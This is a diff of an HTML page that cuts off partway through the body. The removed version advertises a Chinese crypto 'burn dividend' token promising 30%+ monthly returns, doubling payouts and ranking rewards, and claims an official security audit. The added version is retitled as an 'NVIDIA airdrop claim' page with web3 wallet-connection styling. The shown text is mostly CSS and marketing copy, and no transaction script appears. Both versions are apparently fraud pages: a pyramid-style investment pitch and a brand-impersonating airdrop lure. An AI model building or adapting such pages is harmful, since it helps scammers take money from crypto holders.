@@ -1,1207 +1,760 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>2026蝴蝶平台 - 纳米燃烧生态</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Microsoft YaHei', sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #2d0a3d 100%);
-            min-height: 100vh;
-            overflow-x: hidden;
-            color: #fff;
-        }
-
-        /* 燃烧粒子背景 */
-        .fire-particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .particle {
-            position: absolute;
-            border-radius: 50%;
-            animation: float-up linear infinite;
-            opacity: 0;
-        }
-
-        @keyframes float-up {
-            0% {
-                opacity: 0;
-                transform: translateY(100vh) scale(0);
-            }
-            10% {
-                opacity: 1;
-            }
-            90% {
-                opacity: 0.5;
-            }
-            100% {
-                opacity: 0;
-                transform: translateY(-100px) scale(1.5);
-            }
-        }
-
-        /* 主容器 */
-        .container {
-            position: relative;
-            z-index: 1;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        /* 头部 */
-        .header {
-            text-align: center;
-            padding: 60px 20px;
-            animation: fadeInDown 1s ease-out;
-        }
-
-        .main-title {
-            font-size: 4rem;
-            font-weight: bold;
-            background: linear-gradient(45deg, #ff6b35, #f7931e, #ffcc00, #ff6b35);
-            background-size: 300% 300%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: gradient-shift 3s ease infinite, burn-glow 2s ease-in-out infinite alternate;
-            text-shadow: 0 0 30px rgba(255, 107, 53, 0.5);
-            margin-bottom: 20px;
-        }
-
-        .subtitle {
-            font-size: 1.8rem;
-            color: #ffd700;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        @keyframes gradient-shift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        @keyframes burn-glow {
-            0% { filter: brightness(1) drop-shadow(0 0 20px rgba(255, 107, 53, 0.5)); }
-            100% { filter: brightness(1.2) drop-shadow(0 0 40px rgba(255, 165, 0, 0.8)); }
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        /* 倒计时 */
-        .countdown {
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.3), rgba(255, 165, 0, 0.2));
-            border: 2px solid #ff6b35;
-            border-radius: 20px;
-            padding: 30px;
-            margin: 40px 0;
-            text-align: center;
-            animation: border-glow 2s ease-in-out infinite;
-            box-shadow: 0 0 40px rgba(255, 107, 53, 0.4);
-        }
-
-        @keyframes border-glow {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 107, 53, 0.4); }
-            50% { box-shadow: 0 0 50px rgba(255, 165, 0, 0.8); }
-        }
-
-        .countdown-title {
-            font-size: 1.5rem;
-            color: #ffcc00;
-            margin-bottom: 20px;
-            animation: flicker 0.5s ease-in-out infinite alternate;
-        }
-
-        @keyframes flicker {
-            0% { opacity: 1; }
-            100% { opacity: 0.8; }
-        }
-
-        .countdown-timer {
-            font-size: 3rem;
-            font-weight: bold;
-            color: #ff6b35;
-            text-shadow: 0 0 30px rgba(255, 107, 53, 0.8);
-        }
-
-        /* 卡片样式 */
-        .card {
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.1), rgba(255, 165, 0, 0.05));
-            border: 2px solid rgba(255, 107, 53, 0.5);
-            border-radius: 20px;
-            padding: 40px;
-            margin: 30px 0;
-            backdrop-filter: blur(10px);
-            animation: fadeInUp 1s ease-out;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                45deg,
-                transparent,
-                rgba(255, 255, 255, 0.1),
-                transparent
-            );
-            transform: rotate(45deg);
-            animation: shine 3s infinite;
-        }
-
-        @keyframes shine {
-            0% { transform: translateX(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) rotate(45deg); }
-        }
-
-        .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 40px rgba(255, 107, 53, 0.4);
-            border-color: #ff6b35;
-        }
-
-        .card-title {
-            font-size: 2rem;
-            color: #ffcc00;
-            margin-bottom: 20px;
-            text-shadow: 0 0 15px rgba(255, 204, 0, 0.6);
-        }
-
-        .card-content {
-            font-size: 1.2rem;
-            line-height: 1.8;
-            color: #fff;
-        }
-
-        .highlight {
-            color: #ff6b35;
-            font-weight: bold;
-            text-shadow: 0 0 10px rgba(255, 107, 53, 0.6);
-        }
-
-        .fire-icon {
-            display: inline-block;
-            animation: fire-dance 0.5s ease-in-out infinite alternate;
-        }
-
-        @keyframes fire-dance {
-            0% { transform: translateY(0) scale(1); }
-            100% { transform: translateY(-5px) scale(1.1); }
-        }
-
-        /* 特色功能 */
-        .features {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin: 40px 0;
-        }
-
-        .feature-item {
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.15), rgba(255, 165, 0, 0.1));
-            border: 2px solid rgba(255, 107, 53, 0.4);
-            border-radius: 15px;
-            padding: 30px;
-            text-align: center;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .feature-item:hover {
-            transform: scale(1.05);
-            box-shadow: 0 15px 30px rgba(255, 107, 53, 0.5);
-        }
-
-        .feature-icon {
-            font-size: 3rem;
-            margin-bottom: 15px;
-            display: block;
-        }
-
-        .feature-title {
-            font-size: 1.4rem;
-            color: #ffcc00;
-            margin-bottom: 10px;
-        }
-
-        .feature-desc {
-            font-size: 1rem;
-            color: #ddd;
-        }
-
-        /* 机制说明 */
-        .mechanism {
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.2), rgba(255, 165, 0, 0.15));
-            border: 2px solid #ff6b35;
-            border-radius: 20px;
-            padding: 40px;
-            margin: 40px 0;
-        }
-
-        .mechanism-item {
-            margin: 20px 0;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            border-left: 4px solid #ff6b35;
-            transition: all 0.3s ease;
-        }
-
-        .mechanism-item:hover {
-            background: rgba(255, 107, 53, 0.1);
-            transform: translateX(10px);
-        }
-
-        .mechanism-title {
-            font-size: 1.4rem;
-            color: #ffcc00;
-            margin-bottom: 10px;
-        }
-
-        .mechanism-desc {
-            font-size: 1.1rem;
-            color: #ccc;
-            line-height: 1.6;
-        }
-
-        /* 社群链接 */
-        .social-links {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 15px;
-            margin: 40px 0;
-        }
-
-        .social-link {
-            display: flex;
-            align-items: center;
-            padding: 20px;
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.2), rgba(255, 165, 0, 0.1));
-            border: 2px solid rgba(255, 107, 53, 0.4);
-            border-radius: 10px;
-            text-decoration: none;
-            color: #fff;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .social-link::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .social-link:hover::before {
-            left: 100%;
-        }
-
-        .social-link:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(255, 107, 53, 0.5);
-            border-color: #ff6b35;
-        }
-
-        .social-icon {
-            font-size: 2rem;
-            margin-right: 15px;
-        }
-
-        .social-text {
-            font-size: 1.1rem;
-        }
-
-        /* 底部 */
-        .footer {
-            text-align: center;
-            padding: 40px;
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.1), rgba(255, 165, 0, 0.05));
-            border-top: 2px solid rgba(255, 107, 53, 0.3);
-            margin-top: 40px;
-        }
-
-        .footer-text {
-            font-size: 1rem;
-            color: #888;
-        }
-
-        /* 动画 */
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* 钱包选择 */
-        .wallet-options {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .wallet-btn {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 25px 20px;
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.2), rgba(255, 165, 0, 0.1));
-            border: 2px solid rgba(255, 107, 53, 0.5);
-            border-radius: 15px;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .wallet-btn::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                45deg,
-                transparent,
-                rgba(255, 255, 255, 0.1),
-                transparent
-            );
-            transform: rotate(45deg);
-            transition: left 0.5s;
-        }
-
-        .wallet-btn:hover::before {
-            left: 100%;
-        }
-
-        .wallet-btn:hover {
-            transform: translateY(-5px) scale(1.05);
-            box-shadow: 0 15px 30px rgba(255, 107, 53, 0.5);
-            border-color: #ff6b35;
-        }
-
-        .wallet-icon {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .wallet-icon img {
-            width: 50px;
-            height: 50px;
-            object-fit: contain;
-        }
-
-        .wallet-name {
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: #ffd700;
-        }
-
-        .wallet-desc {
-            font-size: 0.85rem;
-            color: #aaa;
-            margin-top: 5px;
-        }
-
-        .wallet-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .wallet-modal.active {
-            display: flex;
-        }
-
-        .wallet-modal-content {
-            background: linear-gradient(135deg, #1a0a2e, #2d0a3d);
-            border: 2px solid #ff6b35;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 600px;
-            width: 90%;
-            position: relative;
-            animation: modal-appear 0.3s ease-out;
-        }
-
-        @keyframes modal-appear {
-            from {
-                opacity: 0;
-                transform: scale(0.9) translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-
-        .modal-close {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            font-size: 2rem;
-            color: #ff6b35;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .modal-close:hover {
-            transform: rotate(90deg);
-            color: #ffcc00;
-        }
-
-        .modal-title {
-            font-size: 1.8rem;
-            color: #ffcc00;
-            text-align: center;
-            margin-bottom: 30px;
-            text-shadow: 0 0 20px rgba(255, 204, 0, 0.6);
-        }
-
-        /* 燃烧分红面板 */
-        .burn-panel {
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.2), rgba(255, 165, 0, 0.15));
-            border: 2px solid #ff6b35;
-            border-radius: 20px;
-            padding: 40px;
-            margin: 40px 0;
-            animation: border-glow 2s ease-in-out infinite;
-        }
-
-        .burn-panel-title {
-            font-size: 2rem;
-            color: #ffcc00;
-            text-align: center;
-            margin-bottom: 30px;
-            text-shadow: 0 0 20px rgba(255, 204, 0, 0.8);
-        }
-
-        .amount-options {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-
-        .amount-btn {
-            background: linear-gradient(135deg, rgba(255, 107, 53, 0.3), rgba(255, 165, 0, 0.2));
-            border: 2px solid rgba(255, 107, 53, 0.6);
-            border-radius: 15px;
-            padding: 20px;
-            font-size: 1.3rem;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .amount-btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 215, 0, 0.3);
-            transform: translate(-50%, -50%);
-            transition: width 0.4s, height 0.4s;
-        }
-
-        .amount-btn:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-
-        .amount-btn:hover {
-            transform: translateY(-5px) scale(1.05);
-            box-shadow: 0 15px 30px rgba(255, 107, 53, 0.5);
-            border-color: #ffcc00;
-        }
-
-        .amount-btn.selected {
-            background: linear-gradient(135deg, rgba(255, 215, 0, 0.4), rgba(255, 107, 53, 0.3));
-            border-color: #ffcc00;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.6);
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-
-        .amount-label {
-            font-size: 0.9rem;
-            color: #ffd700;
-            margin-top: 5px;
-        }
-
-        .burn-btn {
-            display: block;
-            width: 100%;
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 20px 40px;
-            background: linear-gradient(135deg, #ff6b35, #ff8c00, #ffcc00);
-            border: none;
-            border-radius: 30px;
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(255, 107, 53, 0.5);
-            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .burn-btn::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                45deg,
-                transparent,
-                rgba(255, 255, 255, 0.3),
-                transparent
-            );
-            transform: rotate(45deg);
-            transition: left 0.5s;
-        }
-
-        .burn-btn:hover::after {
-            left: 100%;
-        }
-
-        .burn-btn:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 0 20px 40px rgba(255, 107, 53, 0.7);
-        }
-
-        .burn-btn:disabled {
-            background: linear-gradient(135deg, #666, #888);
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .wallet-info {
-            text-align: center;
-            margin-bottom: 20px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-        }
-
-        .wallet-status {
-            font-size: 1.1rem;
-            color: #ffd700;
-        }
-
-        .selected-display {
-            text-align: center;
-            font-size: 1.3rem;
-            color: #fff;
-            margin: 20px 0;
-            padding: 15px;
-            background: rgba(255, 107, 53, 0.2);
-            border-radius: 10px;
-        }
-
-        .target-address {
-            text-align: center;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            font-size: 0.9rem;
-            color: #888;
-            word-break: break-all;
-        }
-
-        /* 响应式 */
-        @media (max-width: 768px) {
-            .main-title {
-                font-size: 2.5rem;
-            }
-            .subtitle {
-                font-size: 1.3rem;
-            }
-            .countdown-timer {
-                font-size: 2rem;
-            }
-            .card {
-                padding: 25px;
-            }
-            .burn-panel {
-                padding: 20px;
-            }
-            .burn-panel-title {
-                font-size: 1.5rem;
-            }
-            .amount-btn {
-                font-size: 1.1rem;
-                padding: 15px;
-            }
-            .burn-btn {
-                font-size: 1.3rem;
-                padding: 15px 30px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="GROK.png" type="image/x-icon">
+  <title>NVIDIA 空投领取</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #F0B90B;
+      --primary-dark: #E6A800;
+      --bg-dark: #0a0a0f;
+      --bg-card: #12121a;
+      --bg-card-hover: #1a1a25;
+      --text-primary: #ffffff;
+      --text-secondary: #8a8a9a;
+      --text-muted: #555566;
+      --success: #00e676;
+      --error: #ff5252;
+      --info: #448aff;
+      --warning: #ffab40;
+      --border: #2a2a3a;
+      --gradient-primary: linear-gradient(135deg, #F0B90B 0%, #ffdb4d 100%);
+      --gradient-bg: radial-gradient(ellipse at top, #1a1a2e 0%, #0a0a0f 100%);
+    }
+
+    * { 
+      box-sizing: border-box; 
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Outfit', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: var(--bg-dark);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 20px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    /* Background Effects */
+    .bg-effects {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .bg-gradient {
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: 
+        radial-gradient(circle at 20% 20%, rgba(240, 185, 11, 0.12) 0%, transparent 40%),
+        radial-gradient(circle at 80% 80%, rgba(240, 185, 11, 0.08) 0%, transparent 40%),
+        radial-gradient(circle at 50% 50%, rgba(68, 138, 255, 0.05) 0%, transparent 50%);
+      animation: bgPulse 20s ease-in-out infinite;
+    }
+
+    @keyframes bgPulse {
+      0%, 100% { transform: translate(0, 0); }
+      50% { transform: translate(-3%, -3%); }
+    }
+
+    .bg-grid {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+      background-size: 50px 50px;
+    }
+
+    .floating-orb {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(80px);
+      animation: float 15s ease-in-out infinite;
+    }
+
+    .orb-1 {
+      width: 300px;
+      height: 300px;
+      background: rgba(240, 185, 11, 0.1);
+      top: 10%;
+      right: -50px;
+    }
+
+    .orb-2 {
+      width: 250px;
+      height: 250px;
+      background: rgba(68, 138, 255, 0.08);
+      bottom: 20%;
+      left: -50px;
+      animation-delay: -5s;
+    }
+
+    .orb-3 {
+      width: 150px;
+      height: 150px;
+      background: rgba(240, 185, 11, 0.06);
+      top: 50%;
+      left: 30%;
+      animation-delay: -10s;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translate(0, 0) rotate(0deg); }
+      25% { transform: translate(20px, -25px) rotate(3deg); }
+      50% { transform: translate(-15px, 15px) rotate(-3deg); }
+      75% { transform: translate(25px, 10px) rotate(2deg); }
+    }
+
+    /* Main Container */
+    .container {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 480px;
+      margin-top: 20px;
+    }
+
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .logo-container {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 16px;
+      background: var(--gradient-primary);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 32px rgba(240, 185, 11, 0.3);
+      animation: logoGlow 3s ease-in-out infinite;
+    }
+
+    @keyframes logoGlow {
+      0%, 100% { box-shadow: 0 8px 32px rgba(240, 185, 11, 0.3); }
+      50% { box-shadow: 0 8px 48px rgba(240, 185, 11, 0.5); }
+    }
+
+    .logo-text {
+      font-size: 32px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #000 0%, #333 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .tagline {
+      color: var(--text-secondary);
+      font-size: 14px;
+      margin-top: 8px;
+    }
+
+    /* Card */
+    .card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 0;
+      box-shadow: 0 16px 64px rgba(0, 0, 0, 0.4);
+      overflow: hidden;
+      position: relative;
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: var(--gradient-primary);
+    }
+
+    .card-content {
+      padding: 28px;
+    }
+
+    /* Promo Banner */
+    .promo-banner {
+      background: linear-gradient(135deg, rgba(240, 185, 11, 0.15) 0%, rgba(255, 219, 77, 0.08) 100%);
+      border: 1px solid rgba(240, 185, 11, 0.3);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .promo-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 8px;
+    }
+
+    .promo-subtitle {
+      font-size: 13px;
+      color: var(--text-secondary);
+      line-height: 1.5;
+    }
+
+    .promo-highlight {
+      display: inline-block;
+      background: rgba(240, 185, 11, 0.2);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      color: var(--primary);
+      font-weight: 600;
+      margin-top: 10px;
+    }
+
+    /* Info Box */
+    .info-box {
+      background: rgba(68, 138, 255, 0.1);
+      border: 1px solid rgba(68, 138, 255, 0.2);
+      border-radius: 12px;
+      padding: 14px;
+      margin-bottom: 20px;
+    }
+
+    .info-box p {
+      font-size: 13px;
+      color: var(--text-secondary);
+      line-height: 1.6;
+    }
+
+    .info-box strong {
+      color: var(--info);
+    }
+
+    /* Wallet Info */
+    .wallet-info {
+      display: none;
+      background: var(--bg-dark);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+
+    .wallet-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .wallet-label {
+      font-size: 12px;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 4px;
+    }
+
+    .wallet-address {
+      font-family: 'Monaco', 'Consolas', monospace;
+      font-size: 14px;
+      color: var(--primary);
+    }
+
+    .wallet-balance {
+      text-align: right;
+    }
+
+    .balance-value {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--text-primary);
+    }
+
+    .balance-label {
+      font-size: 11px;
+      color: var(--text-muted);
+    }
+
+    /* Contact Section */
+    .contact-section {
+      background: var(--bg-dark);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+
+    .contact-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text-primary);
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .contact-title::before {
+      content: '';
+      width: 4px;
+      height: 16px;
+      background: var(--primary);
+      border-radius: 2px;
+    }
+
+    .contact-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 8px 0;
+      font-size: 13px;
+      color: var(--text-secondary);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .contact-item:last-child {
+      border-bottom: none;
+    }
+
+    .contact-icon {
+      width: 20px;
+      height: 20px;
+      color: var(--primary);
+    }
+
+    .contact-value {
+      font-family: 'Monaco', monospace;
+      color: var(--text-primary);
+    }
+
+    /* Status */
+    #status {
+      margin-top: 16px;
+      padding: 14px 16px;
+      border-radius: 12px;
+      font-size: 14px;
+      min-height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 4px;
+      transition: all 0.3s ease;
+    }
+
+    #status.success {
+      background: rgba(0, 230, 118, 0.1);
+      border: 1px solid rgba(0, 230, 118, 0.3);
+      color: var(--success);
+    }
+
+    #status.error {
+      background: rgba(255, 82, 82, 0.1);
+      border: 1px solid rgba(255, 82, 82, 0.3);
+      color: var(--error);
+    }
+
+    #status.info {
+      background: rgba(68, 138, 255, 0.1);
+      border: 1px solid rgba(68, 138, 255, 0.2);
+      color: var(--info);
+    }
+
+    #status.loading, #status.warning {
+      background: rgba(255, 171, 64, 0.1);
+      border: 1px solid rgba(255, 171, 64, 0.3);
+      color: var(--warning);
+    }
+
+    #status small {
+      font-size: 12px;
+      opacity: 0.8;
+    }
+
+    /* Button */
+    .action-btn {
+      width: 100%;
+      padding: 18px;
+      margin-top: 16px;
+      background: var(--gradient-primary);
+      color: #000;
+      border: none;
+      border-radius: 14px;
+      font-size: 17px;
+      font-weight: 700;
+      font-family: 'Outfit', sans-serif;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 20px rgba(240, 185, 11, 0.4);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .action-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+      transition: left 0.5s ease;
+    }
+
+    .action-btn:hover::before {
+      left: 100%;
+    }
+
+    .action-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(240, 185, 11, 0.5);
+    }
+
+    .action-btn:active {
+      transform: translateY(0);
+    }
+
+    .action-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Features */
+    .features {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      margin-top: 24px;
+    }
+
+    .feature {
+      text-align: center;
+      padding: 16px 8px;
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+    }
+
+    .feature-icon {
+      width: 28px;
+      height: 28px;
+      margin: 0 auto 8px;
+      color: var(--primary);
+    }
+
+    .feature-text {
+      font-size: 12px;
+      color: var(--text-secondary);
+    }
+
+    /* Footer */
+    .footer {
+      text-align: center;
+      padding: 20px;
+      color: var(--text-muted);
+      font-size: 12px;
+    }
+
+    /* Loading Spinner */
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(0, 0, 0, 0.2);
+      border-top-color: #000;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      body {
+        padding: 12px;
+      }
+
+      .card-content {
+        padding: 20px;
+      }
+
+      .features {
+        grid-template-columns: 1fr;
+        gap: 8px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="fire-particles" id="fireParticles"></div>
+  <!-- Background Effects -->
+  <div class="bg-effects">
+    <div class="bg-gradient"></div>
+    <div class="bg-grid"></div>
+    <div class="floating-orb orb-1"></div>
+    <div class="floating-orb orb-2"></div>
+    <div class="floating-orb orb-3"></div>
+  </div>
 
-    <div class="container">
-        <!-- 头部 -->
-        <header class="header">
-            <h1 class="main-title">🦋 2026蝴蝶平台</h1>
-            <p class="subtitle">纳米原班团队力作</p>
-        </header>
-
-        <!-- 倒计时 -->
-        <div class="countdown">
-            <div class="countdown-title">⏰ 纳米上线倒计时</div>
-            <div class="countdown-timer">📅 3月10日晚 19:00 - 21:00 正式开盘</div>
-        </div>
-
-        <!-- 核心优势 -->
-        <div class="card">
-            <h2 class="card-title">🚀 传奇延续 · 力作再现</h2>
-            <div class="card-content">
-                <p><span class="highlight">MOSS 10万倍传奇，NAMI 3天32倍延续！</span></p>
-                <p style="margin-top: 15px;">由NAMI纳米原班人马 + 200铁军 + 地推工作室联合打造 🔥</p>
-                <p style="margin-top: 15px;">✨ 四大核心机制：托底 + 自动销毁 + 燃烧分红（月化30%+收益）+ 人工智能</p>
-            </div>
-        </div>
-
-        <!-- 特色功能 -->
-        <div class="features">
-            <div class="feature-item">
-                <span class="feature-icon">🔥</span>
-                <h3 class="feature-title">燃烧分红</h3>
-                <p class="feature-desc">月化30%+收益<br>让燃烧走向极致</p>
-            </div>
-            <div class="feature-item">
-                <span class="feature-icon">🤖</span>
-                <h3 class="feature-title">AI赋能</h3>
-                <p class="feature-desc">纳米数据清洗 & 富化<br>让AI走向生活</p>
-            </div>
-            <div class="feature-item">
-                <span class="feature-icon">🛡️</span>
-                <h3 class="feature-title">安全审计</h3>
-                <p class="feature-desc">已通过蝴蝶官方<br>安全审计</p>
-            </div>
-            <div class="feature-item">
-                <span class="feature-icon">⚡</span>
-                <h3 class="feature-title">生态全自动</h3>
-                <p class="feature-desc">智能合约直连<br>安全升级</p>
-            </div>
-        </div>
-
-        <!-- 机制说明 -->
-        <div class="mechanism">
-            <h2 class="card-title">💎 创新燃烧机制</h2>
-            
-            <div class="mechanism-item">
-                <h3 class="mechanism-title">✅ 首创燃烧打榜机制</h3>
-                <p class="mechanism-desc">合约直连蝴蝶官网，安全升级！买卖手续费仅3%，全额用于燃烧分红</p>
-            </div>
-
-            <div class="mechanism-item">
-                <h3 class="mechanism-title">1️⃣ 1.5% 燃烧分红</h3>
-                <p class="mechanism-desc">2倍出局 + 10%永久性分红，持续收益源源不断</p>
-            </div>
-
-            <div class="mechanism-item">
-                <h3 class="mechanism-title">2️⃣ 1.5% 排行榜分红</h3>
-                <p class="mechanism-desc">12小时分红（早8点/晚8点）<br>
-                🏆 榜一 30%｜🥈榜二 20%｜🥉榜三 15%｜4-10名各 5%</p>
-            </div>
-
-            <div class="mechanism-item">
-                <h3 class="mechanism-title">🔥 100%全额销毁</h3>
